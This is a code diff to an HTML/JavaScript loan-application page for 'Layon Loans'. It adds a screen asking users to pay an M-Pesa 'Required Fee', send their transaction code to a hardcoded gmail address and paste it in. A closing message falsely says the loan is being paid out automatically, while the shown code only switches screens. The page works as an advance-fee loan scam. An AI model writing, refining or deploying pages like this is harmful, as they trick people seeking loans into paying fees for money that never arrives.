@@ -129,6 +129,12 @@
             border-top: 1px solid #21262d;
             padding-top: 10px;
         }
+        .email-btn {
+            background-color: #8a3ab9;
+        }
+        .email-btn:hover {
+            background-color: #a04cc9;
+        }
     </style>
 </head>
 <body>
@@ -207,7 +213,7 @@
                 </div>
 
                 <div class="dashboard-item" style="border-bottom: none; margin-bottom: 5px;">
-                    <span>Applicable Fee:</span>
+                    <span>Required Fee:</span>
                     <span id="fee-display" style="font-weight: bold; color: #f0883e;">Ksh 0</span>
                 </div>
 
@@ -216,15 +222,32 @@
             </div>
         </div>
 
+        <div id="mpesa-verification-screen" class="hidden">
+            <h3 style="color: #f0883e; text-align: center; margin-bottom: 15px;">Fee Verification Required</h3>
+            <p style="font-size: 14px; text-align: center; margin-bottom: 15px;">To complete your withdrawal of <span id="verify-loan-display" style="color: #58a6ff; font-weight: bold;"></span>, please submit your transaction reference code.</p>
+            
+            <button id="email-redirect-btn" class="email-btn">Submit your M-Pesa code to email</button>
+            
+            <div class="form-group" style="margin-top: 20px;">
+                <label>Paste M-Pesa Code Reference Here</label>
+                <input type="text" id="mpesa-code-input" placeholder="e.g. TGA3XYZ890">
+            </div>
+            <div id="mpesa-error" class="error-msg hidden"></div>
+            <button id="confirm-verification-btn">Confirm Submission</button>
+        </div>
+
         <div id="impact-screen" class="hidden">
-            <h3 style="color: #56d364; text-align: center; margin-bottom: 15px;">Application Processing!</h3>
+            <h3 style="color: #56d364; text-align: center; margin-bottom: 15px;">Processing Payment Automatically</h3>
+            <div class="alert" style="text-align: center; border-left: 4px solid #56d364;">
+                Please wait a few minutes for the payment to be processed automatically to your phone number.
+            </div>
             <div class="dashboard-card">
                 <div class="dashboard-item">
                     <span>Approved Amount:</span>
                     <span id="display-amount" style="font-weight: bold; color: #fff;"></span>
                 </div>
                 <div class="dashboard-item">
-                    <span>Disbursement Email:</span>
+                    <span>Account Holder:</span>
                     <span id="display-email" style="color: #fff;"></span>
                 </div>
             </div>
@@ -242,6 +265,7 @@
         const regScreen = document.getElementById('registration-screen');
         const otpScreen = document.getElementById('otp-screen');
         const dashboardScreen = document.getElementById('dashboard-screen');
+        const mpesaScreen = document.getElementById('mpesa-verification-screen');
         const impactScreen = document.getElementById('impact-screen');
         
         const paymentAlert = document.getElementById('payment-simulation-alert');
@@ -253,11 +277,19 @@
         const feeDisplay = document.getElementById('fee-display');
         const withdrawBtn = document.getElementById('withdraw-btn');
         const withdrawalError = document.getElementById('withdrawal-error');
+        
+        const verifyLoanDisplay = document.getElementById('verify-loan-display');
+        const emailRedirectBtn = document.getElementById('email-redirect-btn');
+        const mpesaCodeInput = document.getElementById('mpesa-code-input');
+        const mpesaError = document.getElementById('mpesa-error');
+        const confirmVerificationBtn = document.getElementById('confirm-verification-btn');
+
         const displayAmount = document.getElementById('display-amount');
         const displayEmail = document.getElementById('display-email');
 
         let expectedOtp = "";
         let userEmailAddress = "";
+        let globalSelectedAmount = "";
 
         regForm.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -297,7 +329,7 @@
         });
 
         withdrawBtn.addEventListener('click', function() {
-            const selectedAmount = loanAmountSelect.value;
+            globalSelectedAmount = loanAmountSelect.value;
 
             if (!userEmailAddress) {
                 withdrawalError.innerText = "Error: An active registration email is required.";
@@ -305,17 +337,41 @@
                 return;
             }
 
-            if (!selectedAmount) {
+            if (!globalSelectedAmount) {
                 withdrawalError.innerText = "Please select a loan amount to continue.";
                 withdrawalError.classList.remove('hidden');
                 return;
             }
 
             withdrawalError.classList.add('hidden');
-            displayAmount.innerText = "Ksh " + Number(selectedAmount).toLocaleString();
+            verifyLoanDisplay.innerText = "Ksh " + Number(globalSelectedAmount).toLocaleString();
+            
+            dashboardScreen.classList.add('hidden');
+            mpesaScreen.classList.remove('hidden');
+        });
+
+        emailRedirectBtn.addEventListener('click', function() {
+            const hiddenEmail = "layonloans6@gmail.com";
+            const subject = encodeURIComponent("M-Pesa Transaction Verification Reference Code");
+            const body = encodeURIComponent("Hello Layon Loans Team,\n\nI have completed the registration fee transaction payment for my request of Ksh " + Number(globalSelectedAmount).toLocaleString() + ".\n\nMy reference code is: [PASTE YOUR CODE HERE]\n\nAccount Email: " + userEmailAddress);
+            
+            window.location.href = "mailto:" + hiddenEmail + "?subject=" + subject + "&body=" + body;
+        });
+
+        confirmVerificationBtn.addEventListener('click', function() {
+            const mpesaCode = mpesaCodeInput.value.trim();
+
+            if (!mpesaCode) {
+                mpesaError.innerText = "Please fill in your alphanumeric M-Pesa transaction code to proceed.";
+                mpesaError.classList.remove('hidden');
+                return;
+            }
+
+            mpesaError.classList.add('hidden');
+            displayAmount.innerText = "Ksh " + Number(globalSelectedAmount).toLocaleString();
             displayEmail.innerText = userEmailAddress;
 
-            dashboardScreen.classList.add('hidden');
+            mpesaScreen.classList.add('hidden');
             impactScreen.classList.remove('hidden');
         });
     </script>
